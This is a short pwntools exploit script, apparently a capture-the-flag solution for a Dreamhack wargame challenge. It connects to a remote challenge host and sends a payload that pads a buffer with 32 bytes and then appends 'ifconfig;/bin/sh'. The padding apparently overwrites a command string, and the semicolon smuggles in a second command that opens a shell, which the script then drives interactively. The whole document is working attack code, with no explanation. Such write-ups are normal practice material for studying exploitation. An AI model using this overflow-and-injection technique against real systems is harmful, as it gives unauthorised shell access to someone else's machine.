from pwn import *

r = remote("host8.dreamhack.games", 19688)

payload = b'A' * 0x20
payload += b'ifconfig'
payload += b';'
payload += b'/bin/sh'

r.sendafter("name: ", payload)

r.interactive()